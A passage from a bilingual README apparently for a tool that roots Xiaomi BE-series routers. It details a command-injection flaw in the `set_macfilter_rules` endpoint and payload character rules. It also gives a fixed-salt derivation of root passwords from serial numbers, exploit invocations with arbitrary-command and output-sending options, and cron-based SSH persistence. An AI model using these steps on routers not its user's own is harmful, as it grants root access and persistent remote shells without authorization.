| Web / 米家的"自动升级"开关 | 改的是 `otapred.settings.auto` | 关掉后不再自动下载安装 |
| **出厂 crontab 定时任务** | `1 3,4,5 * * * /usr/sbin/otapredownload` | 每天凌晨 3/4/5 点跑，内部 `ota_upgrade()` 会拉新固件 |

所以建议**两条都堵上**：

```sh
# 1. 确认开关已关（应为 0）
uci get otapred.settings.auto
# 不是 0 就执行：
uci set otapred.settings.auto=0; uci commit otapred

# 2. 去掉 crontab 里的 OTA 任务（3.4 节给的 crontab 已经去掉了）
grep otapredownload /etc/crontabs/root || echo "已移除"

# 3. 可选：DNS 层面屏蔽 OTA 服务器，双保险
uci add_list dhcp.@dnsmasq[0].address='/bigota.miwifi.com/0.0.0.0'
uci commit dhcp && /etc/init.d/dnsmasq restart
```

第 3 步会让 `bigota.miwifi.com`（小米 OTA 下载服务器）解析到 `0.0.0.0`，
即使前两步失效也下不到固件。**代价是你想主动升级时要先撤掉这条。**

**Q：重启后 SSH 还在吗？**

**在。** [3.4 持久化](#34-持久化重启后还能进来) 已由社区在 RP02 上实测验证：
重启后约 1 分钟内（crontab 每分钟兜底触发）dropbear 会自动起来，可以再次 SSH 登录。

万一在你的机器上没生效，重跑一次 3.2 即可恢复 —— 漏洞一直在，不会把你锁在外面。

**Q：官方 SSH 工具能用吗？**

不支持 RP01 这类新型号。

**Q：能降级到旧版本吗？**

不能。RP01 从发布至今只有 1.0.67 一个版本。

**Q：拿到 root 之后能做什么？**

看 WiFi 密码、关数据上报、装插件、去广告、备份/刷机……那是另一篇文章了。

**Q：SN 和密码能告诉别人吗？**

**不要。** SN 可以直接算出你设备的 root 密码。

---

### 7. 附录

#### 依赖关系

备份接收端和密码计算器仅需 Python 3 标准库。利用脚本另需 `requests`
（`python3 -m pip install requests`）。

刻意**不依赖** [xmir-patcher](https://github.com/openwrt-xiaomi/xmir-patcher)，原因有三：

1. 该仓库**未声明开源许可证**（GitHub 显示 "No license"），法律上默认是"保留所有权利"。
   复制或合并其代码会带来许可风险 —— 本项目**没有复制它的任何一行代码**。
2. 本项目的目的恰恰是提供一条**不依赖它**的路径：xmir-patcher 的入口在 1.0.67 上全部失效。
3. 单文件、零依赖更利于使用者审计，也更容易长期存活。

#### 致谢与相关项目

本项目的分析受以下工作启发，特此致谢（均为链接引用，未复制任何代码）：

| 项目 | 与本项目关系 |
|---|---|
| [openwrt-xiaomi/xmir-patcher](https://github.com/openwrt-xiaomi/xmir-patcher) | 小米路由器 root 生态的重要基础工作。本项目在其失效的场景（RP01 / 1.0.67）下提供替代路径，两者是互补而非竞争 |
| `unluac_miwifi`（NyaMisty 维护的 fork） | 反编译小米定制的 Lua 字节码，用于定位 `set_macfilter_rules` 的漏洞链 |
| [QEMU](https://www.qemu.org/) user-mode | 在 x86 机器上仿真固件自带的 ARM 二进制（Lua、busybox、dropbear），让每一环都能实测而非猜测 |
| [OpenWrt](https://openwrt.org/) | 小米固件基于其二次开发，分区布局与启动流程的分析基础 |

#### 文件说明

| 文件 | 作用 |
|---|---|
| `tools/calc_root_pwd.py` | 由 SN 计算 root 密码，含 14 组自测样本 |
| `tools/exploit_set_macfilter_rules.py` | 漏洞利用（单接口、自研、无自动探测） |
| `tools/recv_backup.py` | flash 备份接收端，自动 base64 解码 + 大小校验 |

#### 关于 xmir-patcher 的自动探测

**不建议**用它来验证漏洞是否成立。公开的 `connect6.py` 会实际发送多种探测参数，
一旦命中还会**设置 SSH、改 root 密码、启动服务** —— 不是只读扫描。
本教程的脚本是单接口单请求，可自行审查源码。

#### 分区表（RP01）

| 分区 | 大小 | 内容 | 备份优先级 |
|---|---|---|---|
| mtd0 / mtd1 | 1.5 MB | SBL1 ×2 | 高 |
| mtd2 | 1 MB | MIBIB 分区表 | 高 |
| mtd3 / mtd4 | 512 KB | BOOTCONFIG ×2 | 中 |
| mtd5 / mtd6 | 3.5 MB | QSEE ×2 | 中 |
| mtd14 / mtd15 | 1.5 MB | APPSBL (uboot) ×2 | 高 |
| **mtd16** | 2 MB | **ART 无线校准** | **最高** |
| mtd17 / mtd18 | 512 KB / 256 KB | TRAINING / LICENSE | 中 |
| mtd19 / mtd20 | 45 MB | rootfs A/B 双份 | 中 |
| **mtd21** | 512 KB | **bdata（SN / MAC / 密钥）** | **最高** |
| mtd23 | 47 MB | overlay（UBI，含 cfg/user/plugin） | 中 |

#### 关键挂载信息

```
/dev/mtdblock29  on /      squashfs  ro     ← 根只读，/usr 改不了
ubi23:cfg        on /data  ubifs     rw     ← 持久化靠它
```

---

### 免责声明

本仓库内容仅用于**研究与你本人拥有的设备**，请勿对未经授权的设备使用。
使用前请完整备份 flash，使用者自行承担全部风险与后果，
作者不对任何设备损坏、数据丢失或保修失效负责。

补充说明（有助于判断本仓库的性质）：

- 不包含任何第三方固件二进制，所有固件分析结论可由使用者自行解包复现
- 利用脚本需要目标设备的 WEB 管理密码；唯一绕过的 `--no-auth` 带有所有权确认护栏
- 无批量扫描、无横向移动、无持久化后门功能，仅面向单台设备
- 若权利方认为本仓库侵犯其权益，请通过 GitHub Issue 联系，会配合处理

**↑ [回到语言选择 / Back to language selector](#top)**

---

<a id="en"></a>

## 🇬🇧 English

By exploiting a previously unused command-injection endpoint,
`api/xqsystem/set_macfilter_rules`, this gets you a full root shell on the **stable**
firmware — no disassembly, no UART soldering, no downgrade, and no xmir-patcher.

### Table of Contents

- [0. Scope and Risks](#0-scope-and-risks)
- [1. Prerequisites](#1-prerequisites)
- [2. Quick Start](#2-quick-start-for-the-impatient)
- [3. Step by Step](#3-step-by-step)
- [4. How the Vulnerability Works](#4-how-the-vulnerability-works)
- [5. Troubleshooting: Four Traps](#5-troubleshooting-four-traps)
- [6. FAQ](#faq-en)
- [7. Appendix](#7-appendix)

---

### 0. Scope and Risks

#### Verified environments

| Device | Model | Firmware | Verified by |
|---|---|---|---|
| Xiaomi BE3600 Pro (wired version) | **RP01** | MiWiFi stable **1.0.67** | Author (kernel `Linux 5.4.213 armv7l`, 2026-09) |
| Xiaomi BE5000 | **RD18** | MiWiFi stable **1.0.91** | [Community report #9](https://github.com/perrywey/xiaomi-rp01-root/issues/9), Telnet access |
| Xiaomi BE3600 Pro 8-port wired version | **RP02** | MiWiFi stable **1.0.46** | Community user report — SSH obtained successfully |

RP01 and RP02 are stable channel, both from the wired-version product line, and their firmware
versions differ (1.0.46 / 1.0.67) — so this endpoint has been present across releases,
rather than being specific to one build.

**Not verified, but may work:** the non-wired BE3600 Pro, BE6500 Pro, and other recent
models. If you succeed, please open an issue with your model + firmware version.

#### Why xmir-patcher doesn't work here

All four of its entry points fail on these devices, for different reasons:

| Entry point | Parameter | Why it fails |
|---|---|---|
| `arn_switch` | `level` | Not in the `hackCheck` whitelist → metacharacters blocked |
| `start_binding` | `uid`, `key` | Same — not whitelisted |
| `set_mac_filter` | `name` | Read via `formvalue("name", nil, "?commonstr")`; that regex blocks `` ` `` `;` `\|` `$` `&` `\|` and newline, so no usable payload survives |
| datacenter / `connect6.py` | multiple | No usable entry point found |

The `set_macfilter_rules` endpoint used here is **a different handler** from
`set_mac_filter`, despite the similar name.

#### Prerequisites and risks

> **You must own the device.** The normal path requires the router's WEB admin password,
> which is itself an authorization gate. The only way to bypass it (`--no-auth`) makes the
> script **stop and ask you to confirm ownership** first.

- For devices you own only
- Voiding your warranty is likely
- Risk of brick exists (follow the guide and back up first — [3.5](#35-back-up-the-flash-strongly-recommended))
- The author is not responsible for any damage

**Do not use this on devices you do not own.** This repository ships **analysis and
self-written scripts only — no third-party firmware binaries**, and the exploit requires
the target's admin password. Those boundaries are deliberate.

---

### 1. Prerequisites

- Your computer and the router on the **same LAN** (default gateway `192.168.31.1`)
- Python 3 (no third-party packages needed)

```bash
git clone https://github.com/pabragin/xiaomi-rp01-root.git && cd xiaomi-rp01-root
```

You need two things:

| Item | Where to find it |
|---|---|
| **Router WEB admin password** | The one you set during initial setup — **not** the WiFi password, **not** your Mi account password |
| **Serial number (SN)** | Sticker on the bottom of the router, e.g. `12345/A1B2C3D4E5F6` (the **slash is part of the SN**). You can also run `nvram get SN` once you have a shell |

---

### 2. Quick Start (for the impatient)

```bash
# 1. Calculate the root password (use your own SN)
python3 tools/calc_root_pwd.py 12345/A1B2C3D4E5F6

# 2. Exploit: start SSH (use your WEB admin password)
python3 tools/exploit_set_macfilter_rules.py --ip 192.168.31.1 --password YOUR_WEB_PASSWORD

# 3. Log in (password = the 8 chars from step 1)
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa \
    -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    root@192.168.31.1
```

On success you'll see the `Welcome to XiaoQiang!` BusyBox banner.

**Please continue with [3.4 persistence](#34-persistence-surviving-reboots) and
[3.5 flash backup](#35-back-up-the-flash-strongly-recommended).**

---

### 3. Step by Step

#### 3.1 Calculate the root password

Xiaomi generates the root password on first boot with `mkxqimage -I` and writes it to
`/etc/shadow`. The algorithm is the first 8 hex chars of `MD5(SN + fixed salt)`, so you
can compute it offline:

```bash
python3 tools/calc_root_pwd.py 12345/A1B2C3D4E5F6
```

To verify the algorithm yourself (compares against the firmware's own `mkxqimage`
running under qemu):

```bash
python3 tools/calc_root_pwd.py --selftest
```

> **For recovering the root password of your own device only.** The SN derives the root
> password directly — never share your SN or the computed password.

#### 3.2 Exploit: enable SSH

```bash
python3 tools/exploit_set_macfilter_rules.py --ip 192.168.31.1 --password YOUR_WEB_PASSWORD
```

By default it starts SSH when Dropbear exists and otherwise uses the
[Telnet fallback](#rd18). `{"code":0}` is an API response, not proof that a
service started. For the SSH branch, verify with:

```bash
nc -vz 192.168.31.1 22      # should print succeeded
```

> **Not sure it applies to your unit? Do a read-only check first** (sends a ping only,
> changes nothing):
> ```bash
> sudo tcpdump -i any icmp &          # in another terminal
> python3 tools/exploit_set_macfilter_rules.py --ip 192.168.31.1 --password YOUR_WEB_PASSWORD --probe
> ```
> An ICMP packet from `192.168.31.1` proves command execution.

Other options:

| Flag | Purpose |
|---|---|
| `--cmd 'id'` | Run an arbitrary command |
| `--cmd 'uname -a' --exfil 192.168.31.100:8001` | Send command output back to your computer |
| `--no-auth` | Skip login (will ask you to confirm device ownership first) |

#### 3.3 Log in

```bash
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa \
    -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    root@192.168.31.1
```

**Those two `-o` flags are mandatory.** The router's dropbear is 2017.75 and only offers
a SHA-1 `ssh-rsa` host key, which OpenSSH 8.8+ (bundled with macOS since Monterey)
disables by default. Without them you get
`no matching host key type found` — which looks like a refusal but is really your client
refusing the algorithm.

Add this to `~/.ssh/config` for convenience:

```
Host miwifi
    HostName 192.168.31.1
    User root
    HostKeyAlgorithms +ssh-rsa
    PubkeyAcceptedAlgorithms +ssh-rsa
    StrictHostKeyChecking no
    UserKnownHostsFile /dev/null
    LogLevel QUIET
```

Then just `ssh miwifi`.

#### 3.4 Persistence (surviving reboots)

> ✅ **Community-verified**: on RP02 it was confirmed that "after a reboot, SSH comes
> back within a minute". That delay is exactly the cron job's one-minute interval.
> If it somehow doesn't work on your unit, just re-run 3.2 — the vulnerability remains,
> so you can never lock yourself out.

**Why this is needed:** `/etc` is a RAM filesystem. Only `nvram` and `/data` (ubifs)
persist. `/etc/crontabs` is bind-mounted to `/data/etc/crontabs`, so a crontab entry
survives reboots.

Paste this into the router shell:

```sh
mkdir -p /data/ssh /etc/dropbear
[ -s /data/ssh/host_key ] || cp /etc/dropbear/dropbear_rsa_host_key /data/ssh/host_key 2>/dev/null
[ -s /data/ssh/host_key ] || dropbearkey -t rsa -f /data/ssh/host_key
cp /data/ssh/host_key /etc/dropbear/dropbear_rsa_host_key
chmod 700 /etc/dropbear; chmod 600 /etc/dropbear/dropbear_rsa_host_key
cat > /data/ssh/boot.sh <<'BOOTEOF'
#!/bin/sh
mkdir -p /etc/dropbear
[ -s /etc/dropbear/dropbear_rsa_host_key ] || cp /data/ssh/host_key /etc/dropbear/dropbear_rsa_host_key
chmod 600 /etc/dropbear/dropbear_rsa_host_key
netstat -ltn 2>/dev/null | grep -q ':22 ' || /usr/sbin/dropbear -p 22
BOOTEOF
chmod 755 /data/ssh/boot.sh
mkdir -p /etc/crontabs
cat > /etc/crontabs/root <<'CRONEOF'
*/5 * * * * command -v sp_check.sh >/dev/null && sp_check.sh
*/2 * * * * command -v logrotate >/dev/null && logrotate /etc/logrotate.conf
*/15 * * * * /usr/sbin/ntpsetclock 60 log >/dev/null 2>&1
* * * * * /usr/sbin/startscene_crontab.lua `/bin/date "+%u %H:%M"`
*/3 * * * * /usr/sbin/mobile_accel.sh check >/dev/null 2>&1
0 */6 * * * command -v sec_cfg_bak.sh >/dev/null && sec_cfg_bak.sh
* * * * * run-parts -a 1min /etc/periodic
*/5 * * * * run-parts -a 5min /etc/periodic
*/10 * * * * run-parts -a 10min /etc/periodic
3 * * * * run-parts -a hourly /etc/periodic
6 1 * * * run-parts -a daily /etc/periodic
*/30 * * * * /usr/sbin/cpu_temperature_protect.sh >/dev/null 2>&1
* * * * * /data/ssh/boot.sh
CRONEOF
chmod 600 /etc/crontabs/root
killall crond 2>/dev/null; sleep 1
/etc/init.d/cron restart 2>/dev/null || /usr/sbin/crond -c /etc/crontabs -b
nvram set ssh_en=1; nvram set telnet_en=1; nvram set uart_en=1; nvram commit
/data/ssh/boot.sh; sleep 1; netstat -ltn | grep ':22 '
```

The last line should print `tcp 0 0 0.0.0.0:22 ... LISTEN`.

> **About that crontab:** it is the stock one **minus** `1 3,4,5 * * * /usr/sbin/otapredownload`
> — Xiaomi's OTA pre-download job, whose internal `ota_upgrade()` is what actually pulls
> new firmware. Removing it prevents silent overnight upgrades. Everything else is kept.

#### 3.5 Back up the flash (strongly recommended)

This is your only undo button. **`mtd16` (ART wireless calibration) and `mtd21` (bdata:
SN, MAC, device keys) cannot be restored from any official firmware** — lose them and a
brick is permanent.

On your computer (leave this terminal running):

```bash
python3 tools/recv_backup.py ~/rp01_backup 8001
```

On the router shell:

```sh
wget -q --post-file=/proc/mtd -O /dev/null http://YOUR_PC_IP:8001/proc-mtd.txt &&
awk -F: '/^mtd[0-9]+:/ {print $1}' /proc/mtd | while read -r m; do
    dd if=/dev/mtdblock"${m#mtd}" of=/tmp/m.bin bs=65536 2>/dev/null &&
    base64 /tmp/m.bin > /tmp/m.b64 &&
    wget -q --post-file=/tmp/m.b64 -O /dev/null http://YOUR_PC_IP:8001/"$m".b64 || break
    rm -f /tmp/m.bin /tmp/m.b64
done
```

The receiver prints a `[OK]` / `[NG]` size check per partition. Every partition listed in `/proc/mtd` must be received and marked `[OK]`. `[NG]` means a size mismatch;
`[UNCHECKED]` means there is no matching device partition size. You can also
load a local snapshot with `--mtd /path/to/proc-mtd.txt`. Large partitions need
enough free space in the router's `/tmp` for both binary and base64 copies.

**Why base64 first?** See [trap 4](#trap-4-backups-arrive-only-a-few-dozen-bytes).

Afterwards, copy `~/rp01_backup` to cloud storage or an external drive.

---

### 4. How the Vulnerability Works

#### 4.1 Call chain

```
POST /cgi-bin/luci/;stok=<TOKEN>/api/xqsystem/set_macfilter_rules
     mac=<valid MAC>&name=<payload>&option=0
  │
  ├─ handler reads name: formvalue("name")        ← 2 args, no regex
  │     (the older set_mac_filter uses formvalue("name", nil, "?commonstr") ← regex)
  │
  ├─ XQSecureUtil.hackCheck would normally filter metacharacters,
  │     but "name" is on its whitelist → passed straight through
  │
  ├─ XQFirewall.setMacFilter(mac, name, "0", "")
  │
  └─ os.execute("/usr/sbin/macfilter add black <mac> rulename=<payload>")
        ↑ no escaping, runs as root
```

#### 4.2 Key code (from the unpacked Lua)

`XQFirewall.lua`:

```lua
L11 = "/usr/sbin/macfilter " .. L7 .. " " .. L8 .. " " .. A0
if A1 then
    L11 = L11 .. " rulename=" .. A1      -- A1 is `name`, unescaped
end
os.execute(L11)
```

`XQSecureUtil.lua`:

```lua
local whitelist = { name = 1, password = 1, ssid = 1, ... }
if whitelist[key] then return true end      -- whitelisted → pass through untouched
-- otherwise check against the forbidden class [ ` ; | $ & \n ]
```

#### 4.3 Payload rules (measured)

| Character | Usable? | Why |
|---|---|---|
| Newline | ✅ | Whitelisted; the handler doesn't split on it |
| Backtick `` ` `` | ✅ | Same |
| `$( )` | ✅ | Same |
| `\|` `&` | ✅ | Same |
| **Semicolon `;`** | ❌ | The handler splits `mac`/`name` on `;`; anything after it is dropped |

Also required:

- `option` must be `0` (=add). With `option=1` (delete) and an absent MAC it returns early.
- `mac` must match `^[0-9a-fA-F:;]+$` and must not already be in the filter table
  (the script generates a fresh random MAC each run).

#### 4.4 Where the root password comes from

`etc/init.d/system`:

```sh
set_user(){
    local inited=$(uci -q get xiaoqiang.common.INITTED)
    [ "$inited" != "YES" ] && {
        local init_pwd=`mkxqimage -I`              # ← password generated here
        [ -n "$init_pwd" ] && {
            (echo $init_pwd; sleep 1; echo $init_pwd) | passwd root
        }
    }
}
```

The stock config has no `INITTED` key, so this always runs on first boot. `mkxqimage`
reads `nvram get SN` and computes
`MD5(SN + "6d2df50a-250f-4a30-a5e6-d44fb0960aa0")`, taking the first 8 characters.

---

### 5. Troubleshooting: Four Traps

#### Trap 1: telnetd won't start (port 23 refused)

Xiaomi **patched busybox's `telnetd`**. On startup it reads:

```
cat /proc/xiaoqiang/ft_mode
cat /usr/share/xiaoqiang/xiaoqiang_version | grep CHANNEL
bdata get telnet_en / nvram get telnet_en
```

On stable (`CHANNEL=release`) it refuses to start unless `telnet_en=1` or `ft_mode=1`.
The gate is **inside the busybox binary**, not in `/etc/init.d/telnet` — so editing the
init script does nothing.

**Fix:** use Dropbear if available, or enable the Telnet flags as described
in the [RD18 section](#rd18).

#### Trap 2: `dropbear -p 22 -R` won't start

`/etc/dropbear/dropbear_rsa_host_key` ships as a **0-byte placeholder**, and `-R`
(auto-generate) will not overwrite an existing file — so dropbear starts with an empty key
and dies.

**Fix: delete it, then generate explicitly**

```sh
rm -f /etc/dropbear/dropbear_rsa_host_key
dropbearkey -t rsa -f /etc/dropbear/dropbear_rsa_host_key
/usr/sbin/dropbear -p 22
```

#### Trap 3: SSH handshake fails

```
Unable to negotiate with 192.168.31.1 port 22: no matching host key type found. Their offer: ssh-rsa
```

dropbear 2017.75 only speaks SHA-1 `ssh-rsa`; OpenSSH 8.8+ disables it by default.

**Fix:** add `-o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa`.

#### Trap 4: Backups arrive only a few dozen bytes

busybox's `wget --post-file` **handles the file as a C string and truncates at the first
`0x00`**. Binary partitions get cut off at their first NUL byte.

The nasty part: partitions that happen to contain no NUL byte come through **completely**,
creating the illusion that the pipeline is fine and only some partitions are broken.
Catching it requires checking the size table.

**Fix: base64 first**

```sh
base64 /tmp/m.bin > /tmp/m.b64     # pure ASCII, no NUL
```

The size check is easy too: `512KB → 4×ceil(524288/3)=699,052` chars + `9,199` newlines
= `708,251` bytes. If that matches, the transfer was complete.

---

<a id="faq-en"></a>

### 6. FAQ

**Q: Will the router disappear from the Mi Home app?**

No. That happens when `CHANNEL` is changed from `release` to `debug`. This guide never
touches it — and on this model `/` is a read-only squashfs with no overlay on `/usr`, so
that file can't be modified anyway.

**Q: Does SSH survive a reboot?**

Yes. [3.4 persistence](#34-persistence-surviving-reboots) was community-verified on RP02:
dropbear comes back within about a minute (the cron interval). If it doesn't work on your
unit, re-run 3.2 — you can't lock yourself out.

**Q: Can I use the official SSH tool?**

No, it doesn't support newer models like RP01.

**Q: Can I downgrade to an older firmware?**

No. RP01 has only ever had 1.0.67.

**Q: Will a firmware update take root away?**

Possibly. Xiaomi has two upgrade paths, and turning off the WEB switch alone is not enough:

| Path | Mechanism | Status |
|---|---|---|
| WEB / Mi Home "auto upgrade" switch | sets `otapred.settings.auto` | disabled once you turn it off |
| **Stock crontab job** | `1 3,4,5 * * * /usr/sbin/otapredownload` | runs at 3/4/5 AM; its `ota_upgrade()` pulls new firmware |

To block both:

```sh
# 1. Confirm the switch is off (should print 0)
uci get otapred.settings.auto
# if not:
uci set otapred.settings.auto=0; uci commit otapred

# 2. Remove the OTA cron job (the crontab in 3.4 already omits it)
grep otapredownload /etc/crontabs/root || echo "already removed"

# 3. Optional: block the OTA server at DNS level
uci add_list dhcp.@dnsmasq[0].address='/bigota.miwifi.com/0.0.0.0'
uci commit dhcp && /etc/init.d/dnsmasq restart
```

Step 3 resolves `bigota.miwifi.com` (Xiaomi's OTA download host) to `0.0.0.0`, so no
firmware can be fetched even if the first two fail. **You'll need to undo it if you ever
want to upgrade deliberately.**

**Q: Can I share my SN or password?**

**No.** The SN derives your device's root password directly.

---

### 7. Appendix

#### Files

| File | Purpose |
|---|---|
| `tools/calc_root_pwd.py` | Derive the root password from the SN; includes a 14-case self-test |
| `tools/exploit_set_macfilter_rules.py` | The exploit (single endpoint, self-written, no auto-probing) |
| `tools/recv_backup.py` | Flash backup receiver; auto base64-decodes and size-checks |

#### On xmir-patcher's auto-probe

**Don't** use it to check whether your device is vulnerable. The public `connect6.py`
sends real probe parameters and, on success, **enables SSH, changes the root password and
starts services** — it is not a read-only scan. The script here is a single request
against a single endpoint; read the source yourself.

#### Partition table (RP01)

| Partition | Size | Contents | Priority |
|---|---|---|---|
| mtd0 / mtd1 | 1.5 MB | SBL1 ×2 | High |
| mtd2 | 1 MB | MIBIB partition table | High |
| mtd3 / mtd4 | 512 KB | BOOTCONFIG ×2 | Medium |
| mtd5 / mtd6 | 3.5 MB | QSEE ×2 | Medium |
| mtd14 / mtd15 | 1.5 MB | APPSBL (uboot) ×2 | High |
| **mtd16** | 2 MB | **ART wireless calibration** | **Highest** |
| mtd17 / mtd18 | 512 KB / 256 KB | TRAINING / LICENSE | Medium |
| mtd19 / mtd20 | 45 MB | rootfs A/B | Medium |
| **mtd21** | 512 KB | **bdata (SN / MAC / keys)** | **Highest** |
| mtd23 | 47 MB | overlay (UBI: cfg/user/plugin) | Medium |

#### Mount information

```
/dev/mtdblock29  on /      squashfs  ro     ← root is read-only; /usr cannot be modified
ubi23:cfg        on /data  ubifs     rw     ← this is what persists
```

#### Regression checks

```bash
python3 -m unittest discover -s tests -v
```

These tests run locally and require `requests`; they do not contact a router.
Hardware access and reboot persistence have not been tested by this fork.

#### Dependencies

The backup receiver and password calculator use the Python 3 standard library.
The exploit script also requires `requests` (`python3 -m pip install requests`).

[xmir-patcher](https://github.com/openwrt-xiaomi/xmir-patcher) is deliberately *not* a
dependency:

1. That repo **declares no license** (GitHub shows "No license"), i.e. all rights reserved
   by default — copying or merging its code would carry license risk. **No line of its
   code is used here.**
2. This project exists precisely to provide a path that does *not* depend on it.
3. Single-file, zero-dependency code is easier to audit and more likely to survive.

#### Credits

Inspired by the following (referenced by link only — no code copied):

| Project | Relation |
|---|---|
| [openwrt-xiaomi/xmir-patcher](https://github.com/openwrt-xiaomi/xmir-patcher) | Foundational work in the Xiaomi router rooting scene; this project complements it on models/firmwares where its entry points fail |
| `unluac_miwifi` (fork by NyaMisty) | Decompiles Xiaomi's custom Lua bytecode; used to locate the call chain |
| [QEMU](https://www.qemu.org/) user-mode | Runs the firmware's own ARM binaries on x86, so every step could be tested instead of guessed |
| [OpenWrt](https://openwrt.org/) | Xiaomi's firmware is based on it |

---

### Disclaimer

For **research and management of devices you own**. Do not use it against devices you are
not authorized to test. Back up your flash before proceeding. You accept all risks; the
author is not liable for any damage, data loss, or voided warranty.

Notes that help characterize this repository:

- Contains no third-party firmware binaries; all firmware analysis can be reproduced
  by unpacking your own device
- The exploit requires the target's WEB admin password, and the only bypass carries an
  ownership confirmation guard
- No scanning, no lateral movement, no backdoor functionality — single-device only
- If a rights holder believes this repository infringes their rights, please open a
  GitHub issue and it will be addressed

**↑ [Back to language selector / 回到语言选择](#top)**
